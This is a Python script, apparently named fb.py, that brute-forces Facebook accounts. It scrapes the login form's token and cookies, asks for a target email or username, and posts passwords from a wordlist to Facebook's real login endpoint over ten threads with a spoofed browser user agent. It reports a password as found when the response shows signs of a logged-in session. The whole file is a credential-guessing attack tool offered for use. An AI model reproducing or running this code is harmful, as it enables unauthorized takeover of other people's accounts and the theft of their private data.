import os.path
import requests
from bs4 import BeautifulSoup
import sys
import logging
from concurrent.futures import ThreadPoolExecutor

if sys.version_info[0] != 3:
    print("Python 3 is required for this script.")
    sys.exit()

# Constants
MIN_PASSWORD_LENGTH = 6
POST_URL = 'https://www.facebook.com/login.php'
HEADERS = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36',
}

# Logging configuration
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# Global variables
PAYLOAD = {}
COOKIES = {}

# Verbose mode
VERBOSE = False


def create_form():
    form = {}
    cookies = {'fr': '0ZvhC3YwYm63ZZat1..Ba0Ipu.Io.AAA.0.0.Ba0Ipu.AWUPqDLy'}

    data = requests.get(POST_URL, headers=HEADERS)
    for i in data.cookies:
        cookies[i.name] = i.value
    data = BeautifulSoup(data.text, 'html.parser').form
    if data.input['name'] == 'lsd':
        form['lsd'] = data.input['value']
    return form, cookies


def is_this_a_password(email, index, password):
    global PAYLOAD, COOKIES
    if index % 10 == 0:
        PAYLOAD, COOKIES = create_form()
        PAYLOAD['email'] = email
    PAYLOAD['pass'] = password
    r = requests.post(POST_URL, data=PAYLOAD, cookies=COOKIES, headers=HEADERS)
    if 'Find Friends' in r.text or 'security code' in r.text or 'Two-factor authentication' in r.text or "Log Out" in r.text:
        open('temp', 'w').write(str(r.content))
        print('\nPassword found: ', password)
        return True
    return False


def try_password(email, index, password):
    if len(password.strip()) < MIN_PASSWORD_LENGTH:
        return False
    if VERBOSE:
        logger.info("Trying password [%d]: %s", index, password)
    return is_this_a_password(email, index, password)


def print_help():
    print("Usage: python fb.py <password_file> [--verbose] [-h, --help]")
    print("Options:")
    print("  <password_file>   Path to the password file")
    print("  --verbose         Enable verbose mode")
    print("  -h, --help        Display this help menu")
    sys.exit(0)


if __name__ == "__main__":
    print('\n================ARE YOU SURE ?================\n')

    # Check for help option
    if "-h" in sys.argv or "--help" in sys.argv:
        print_help()

    if len(sys.argv) < 2:
        print("Usage: python fb.py <password_file> [--verbose]")
        sys.exit(1)

    PASSWORD_FILE = sys.argv[1]

    if not os.path.isfile(PASSWORD_FILE):
        print("Password file does not exist: ", PASSWORD_FILE)
        sys.exit(0)

    # Check for verbosity
    if "--verbose" in sys.argv:
        VERBOSE = True
        sys.argv.remove("--verbose")

    print("Password file selected: ", PASSWORD_FILE)
    email = input('Enter Email/Username to target: ').strip()
    password_data = open(PASSWORD_FILE, 'r').read().split("\n")

    with ThreadPoolExecutor(max_workers=10) as executor:
        future_to_password = {executor.submit(try_password, email, index, password): password for index, password in enumerate(password_data)}
        for future in concurrent.futures.as_completed(future_to_password):
            password = future_to_password[future]
            try:
                if future.result():
                    break
            except Exception as exc:
                logger.exception('Exception for password [%s]: %s', password, exc)
